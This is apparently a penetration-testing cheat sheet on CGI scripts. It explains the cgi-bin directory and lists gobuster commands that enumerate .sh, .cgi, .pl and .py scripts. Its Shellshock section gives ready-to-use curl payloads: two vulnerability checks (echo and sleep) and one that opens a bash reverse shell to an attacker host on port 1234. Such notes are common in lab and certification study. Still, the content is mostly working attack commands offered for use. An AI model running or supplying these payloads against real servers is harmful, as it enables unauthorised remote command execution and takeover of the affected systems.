## /cgi-bin/

Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.

Most servers expect CGI scripts to reside in a special directory, usually called cgi-bin, to handle the requests correctly and execute the program instead of returning the file content. 1

A scripts in /cgi-bin/ may have extensions cgi, sh, pl, py.
```
gobuster fuzz -u http:/<IP>/cgi-bin/FUZZ.sh -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -b 404
gobuster fuzz -u http:/<IP>/cgi-bin/FUZZ.cgi -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -b 404
gobuster fuzz -u http:/<IP>/cgi-bin/FUZZ.pl -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -b 404
gobuster fuzz -u http:/<IP>/cgi-bin/FUZZ.py -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -b 404
```

## Shellshock
https://0xffsec.com/handbook/web-applications/cgi/

```
curl -fs -H "user-agent: () { :; }; echo; echo 'vulnerable'" http://<IP>/cgi-bin/vulnerable | grep vulnerable
curl -fs -H "user-agent: () { :; }; /bin/bash -c 'sleep 5'" http://<IP>/cgi-bin/vulnerable
curl -fs -H "user-agent: () { :; }; /bin/bash -i >& /dev/tcp/<KALI IP>/1234 0>&1" http://<IP>/cgi-bin/vulnerable
```
